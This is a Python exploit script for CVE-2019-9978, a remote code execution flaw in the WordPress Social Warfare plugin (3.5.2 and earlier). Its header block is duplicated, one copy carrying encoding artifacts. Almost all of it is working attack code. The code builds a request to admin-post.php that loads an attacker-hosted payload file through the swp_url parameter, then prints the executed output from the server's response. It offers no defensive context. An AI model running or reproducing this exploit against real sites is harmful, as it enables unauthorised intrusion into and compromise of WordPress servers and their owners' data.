# Title: RCE in Social Warfare Plugin Wordpress ( <=3D3.5.2 )
# Date: March, 2019
# Researcher: Luka Sikic
# Exploit Author: hash3liZer
# Download Link: https://wordpress.org/plugins/social-warfare/
# Reference: https://wpvulndb.com/vulnerabilities/9259?fbclid=3DIwAR2xLSnan=ccqwZNqc2c7cIv447Lt80mHivtyNV5ZXGS0ZaScxIYcm1XxWXM
# Github: https://github.com/hash3liZer/CVE-2019-9978
# Version: <=3D 3.5.2
# CVE: CVE-2019-9978

# Title: RCE in Social Warfare Plugin Wordpress ( <=3.5.2 )
# Date: March, 2019
# Researcher: Luka Sikic
# Exploit Author: hash3liZer
# Download Link: https://wordpress.org/plugins/social-warfare/
# Reference: https://wpvulndb.com/vulnerabilities/9259?fbclid=IwAR2xLSnanccqwZNqc2c7cIv447Lt80mHivtyNV5ZXGS0ZaScxIYcm1XxWXM
# Github: https://github.com/hash3liZer/CVE-2019-9978
# Version: <= 3.5.2
# CVE: CVE-2019-9978

import sys
import requests
import re
import urlparse
import optparse

class EXPLOIT:

	VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"

	def __init__(self, _t, _p):
		self.target  = _t
		self.payload = _p

	def engage(self):
		uri = urlparse.urljoin( self.target, self.VULNPATH % self.payload )
		r = requests.get( uri )
		if r.status_code == 500:
			print "[*] Received Response From Server!"
			rr  = r.text
			obj = re.search(r"^(.*)<\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
			if obj:
				resp = obj.groups()[0]
				if resp:
					print "[<] Received: "
					print resp.replace( "lnbreak", "\n" )
				else:
					sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
			else:
				sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
		else:
			sys.exit( "[~] Unexpected Status Received!" )

def main():
	parser = optparse.OptionParser(  )

	parser.add_option( '-t', '--target', dest="target", default="", type="string", help="Target Link" )
	parser.add_option( ''  , '--payload-uri', dest="payload", default="", type="string", help="URI where the file payload.txt is located." )

	(options, args) = parser.parse_args()

	print "[>] Sending Payload to System!"
	exploit = EXPLOIT( options.target, options.payload )
	exploit.engage()

if __name__ == "__main__":
	main()